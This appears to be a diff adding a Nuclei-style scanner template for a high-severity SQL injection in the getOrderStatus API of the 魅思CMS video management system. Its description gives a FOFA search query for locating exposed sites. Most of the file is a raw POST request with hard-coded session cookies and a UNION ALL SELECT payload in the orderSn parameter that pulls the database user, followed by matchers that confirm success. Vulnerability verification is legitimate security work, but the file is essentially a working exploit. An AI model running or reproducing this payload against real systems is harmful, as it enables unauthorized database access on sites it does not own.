@@ -1,0 +1,29 @@
+id: meisi-cms-video-system-sql
+
+info:
+  name: "魅思CMS视频管理系统getOrderStatus方法SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: product="魅思-视频管理系统"
+          框架ThinkPHP 5/6在/controller/Api.php控制器的getOrderStatus方法中，通过POST请求接收orderSn参数时未进行安全过滤，直接将其拼接至SQL查询的where条件中，导致存在SQL注入漏洞。
+  tags: 魅思CMS
+
+http:
+- raw:
+  - |
+    POST /api/getOrderStatus HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+    Cookie: admin_token=6169XyCZ4aFgkoAJYWPrmlH5uKLQOLMi8CwWeC%2FK; PHPSESSID=tctb1jo24sk33pvb4hk350vk29
+
+    orderSn=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL-- -
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'orderStatus'
